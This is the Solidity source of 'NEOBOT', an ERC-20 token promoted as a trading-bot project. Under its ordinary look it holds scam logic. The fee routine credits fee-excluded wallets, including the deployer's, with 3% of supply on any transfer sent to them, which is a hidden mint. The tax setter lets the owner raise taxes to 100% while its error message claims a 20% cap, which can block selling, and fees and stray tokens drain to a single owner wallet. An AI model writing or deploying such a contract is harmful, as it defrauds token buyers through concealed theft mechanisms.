// SPDX-License-Identifier: MIT

/*
NEOBOT is the top-notch solutions for shitcoin/dex traders to make the most informative market decisions.

Website: https://www.neobot.run
Twitter: https://twitter.com/NeoBot_ERC20
Telegram: https://t.me/NeoBot_ERC20
*/

pragma solidity 0.8.21;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "Ownable: Caller is not owner"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}
interface InterRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
interface InterFactory {
    function createPair(address tokenA, address tokenB) external returns (address uniPairAddy);
}
interface InterERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract NEOBOT is Ownable, InterERC20 {
    using SafeMath for uint256;
    string private constant _name = "NEOBOT";
    string private constant _symbol = "NEOBOT";
    uint8 private constant _decimals = 9;
    uint256 private _supplyTotal = 10 ** 9 * (10 ** _decimals);
    
    InterRouter private _dexRouter;
    address public uniPairAddy;
    bool private enabledTrading = false;
    bool private activatedSwap = true;
    uint256 private minimumSwaps;
    bool private inswapping;
    uint256 currentSwaps;
    uint256 private maxCASwapAmount = _supplyTotal * 1000 / 100000;
    uint256 private minCASwapAmount = _supplyTotal * 10 / 100000;
    modifier reEntrance {inswapping = true; _; inswapping = false;}
    uint256 private autoLpTaxFee = 0;
    uint256 private marketerTaxFee = 0;
    uint256 private developerTaxFee = 100;
    uint256 private burningTaxFee = 0;
    uint256 private buyingTaxFee = 1500;
    uint256 private sellingTaxFee = 1500;
    uint256 private transferingTaxFee = 1000;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devFeeAddy = 0xF91CDB50c071ABBd2Bce9a7B17c081a406e62cf3; 
    address internal marketingFeeAddy = 0xF91CDB50c071ABBd2Bce9a7B17c081a406e62cf3;
    address internal lpFeeAddy = 0xF91CDB50c071ABBd2Bce9a7B17c081a406e62cf3;
    uint256 public _maxxTrxSize = ( _supplyTotal * 300 ) / 10000;
    uint256 public _maxxTransferSize = ( _supplyTotal * 300 ) / 10000;
    uint256 public _maxxWalletSize = ( _supplyTotal * 300 ) / 10000;

    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    constructor() Ownable(msg.sender) {
        InterRouter _dexRouter = InterRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = InterFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        _dexRouter = _dexRouter; uniPairAddy = _pair;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[lpFeeAddy] = true;
        _isExcludedFromFee[marketingFeeAddy] = true;
        _isExcludedFromFee[devFeeAddy] = true;
        _balances[msg.sender] = _supplyTotal;
        emit Transfer(address(0), msg.sender, _supplyTotal);
    }
    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function getOwner() external view override returns (address) { return owner; }
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function enableTrading() external onlyOwner {enabledTrading = true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supplyTotal.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function setMaxSize(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supplyTotal.mul(_buy).div(10000); uint256 newTransfer = _supplyTotal.mul(_sell).div(10000); uint256 newWallet = _supplyTotal.mul(_wallet).div(10000);
        _maxxTrxSize = newTx; _maxxTransferSize = newTransfer; _maxxWalletSize = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function cleanDusttokens(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = InterERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        InterERC20(_address).transfer(devFeeAddy, _amount);
    }
    function feeDenominatorByType(address sender, address recipient) internal view returns (uint256) {
        if(recipient == uniPairAddy){return sellingTaxFee;}
        if(sender == uniPairAddy){return buyingTaxFee;}
        return transferingTaxFee;
    }
    function getAmountForActualFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (_isExcludedFromFee[recipient]) {return _maxxTrxSize;}
        if(feeDenominatorByType(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(feeDenominatorByType(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burningTaxFee > uint256(0) && feeDenominatorByType(sender, recipient) > burningTaxFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burningTaxFee));}
        return amount.sub(feeAmount);} return amount;
    }
    function canContractTaxFeeSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minCASwapAmount;
        bool aboveThreshold = balanceOf(address(this)) >= maxCASwapAmount;
        return !inswapping && activatedSwap && enabledTrading && aboveMin && !_isExcludedFromFee[sender] && recipient == uniPairAddy && minimumSwaps >= currentSwaps && aboveThreshold;
    }
    function setFeeDenominators(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        autoLpTaxFee = _liquidity; marketerTaxFee = _marketing; burningTaxFee = _burn; developerTaxFee = _development; buyingTaxFee = _total; sellingTaxFee = _sell; transferingTaxFee = _trans;
        require(buyingTaxFee <= denominator.div(1) && sellingTaxFee <= denominator.div(1) && transferingTaxFee <= denominator.div(1), "buyingTaxFee and sellingTaxFee cannot be more than 20%");
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpFeeAddy,
            block.timestamp);
    }
    function swapTaxFeeAndSend(uint256 tokens) private reEntrance {
        uint256 _denominator = (autoLpTaxFee.add(1).add(marketerTaxFee).add(developerTaxFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(autoLpTaxFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForTaxFee(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(autoLpTaxFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(autoLpTaxFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketerTaxFee);
        if(marketingAmt > 0){payable(marketingFeeAddy).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devFeeAddy).transfer(contractBalance);}
    }
    function swapTokensForTaxFee(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]){require(enabledTrading, "enabledTrading");}
        if(!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient] && recipient != address(uniPairAddy) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxxWalletSize, "Exceeds maximum wallet amount.");}
        if(sender != uniPairAddy){require(amount <= _maxxTransferSize || _isExcludedFromFee[sender] || _isExcludedFromFee[recipient], "TX Limit Exceeded");}
        require(amount <= _maxxTrxSize || _isExcludedFromFee[sender] || _isExcludedFromFee[recipient], "TX Limit Exceeded"); 
        if(recipient == uniPairAddy && !_isExcludedFromFee[sender]){minimumSwaps += uint256(1);}
        if(canContractTaxFeeSwap(sender, recipient, amount)){swapTaxFeeAndSend(maxCASwapAmount); minimumSwaps = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !_isExcludedFromFee[sender] ? getAmountForActualFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
}